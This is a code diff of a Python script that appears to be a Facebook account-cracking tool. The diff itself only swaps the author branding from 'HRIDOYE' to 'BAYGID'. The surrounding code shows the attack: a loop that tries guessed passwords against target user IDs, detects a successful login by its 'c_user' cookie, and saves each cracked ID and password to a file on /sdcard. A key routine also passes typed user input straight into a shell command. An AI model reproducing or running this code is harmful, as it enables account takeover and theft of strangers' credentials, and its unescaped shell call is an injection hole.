@@ -1,4 +1,4 @@
-#HR1DOYE
+#BAYGID
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -128,10 +128,10 @@ logo=("""
 \033[32;1m║║║╠═╣╠═╣╠═╣ ║║║  ┌┴┬┘  ╠═╣╠╦╝║ ║║║ ║╚╦╝║╣ 
 \033[33;1m╩ ╩╩ ╩╩ ╩╩ ╩═╩╝╩  ┴ └─  ╩ ╩╩╚═╩═╩╝╚═╝ ╩ ╚═╝
 \x1b[38;5;46m______________________________________________________
- \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : ARIYAN HRIDOYE 
+ \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : ARIYAN BAYGID 
  \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : MD MAHADI
- \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : ARIYAN HRIDOYE 
- \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : MAHADI-HRIDOYE
+ \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : ARIYAN BAYGID 
+ \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : MAHADI-BAYGID
  \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m TOOLS     : RENDOM
  \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-9]
 \x1b[38;5;46m_____________________________________________________
@@ -257,7 +257,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[HRIDOYE]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[BAYGID]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -296,10 +296,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [HRIDOYE-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [BAYGID-OK] '+cid+' | '+ps+'\33[0;92m')
                 #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/HRIDOYE-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/BAYGID -ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -308,7 +308,7 @@ def b(uid,pwx,tl):
 
         pass
 def superuser():
-    UMO="HRIDOYE-"
+    UMO="BAYGID-"
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
@@ -331,7 +331,7 @@ def superuser():
         print ("")
         print (" Your Key : "+UMO+id)
         print ("\n")
-        os.system("espeak \"assalamualaikum ,I am HRIDOYE VAI er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
+        os.system("espeak \"assalamualaikum ,I am BAYGID VAI er  ROBOT and my boss is BAYGID.Sir this tool is paid because 100% ok id just now login\"")
         name = input(" Your Name : ")
         os.system(f"espeak \"{name} ,prass Enter to send your key\"")
         print ("")
